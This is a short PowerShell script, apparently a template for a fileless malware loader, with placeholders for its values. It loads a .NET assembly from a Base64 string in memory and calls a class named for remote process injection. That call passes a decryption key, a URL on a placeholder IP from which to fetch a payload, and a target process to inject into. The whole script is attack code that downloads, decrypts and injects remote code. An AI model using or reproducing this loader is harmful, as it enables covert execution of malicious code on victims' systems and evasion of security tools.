function load_d
{
	$encrypt = $false
	$decrypt = $true
	[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('<BASE64STRING>')
	[Rem_proc_inj.ex_program]::ex_prog("<SECRET>", $encrypt, $decrypt, "http://<IP>/<PAYLOAD_FILE>", "", "", "<PROCESS>")
}
load_d
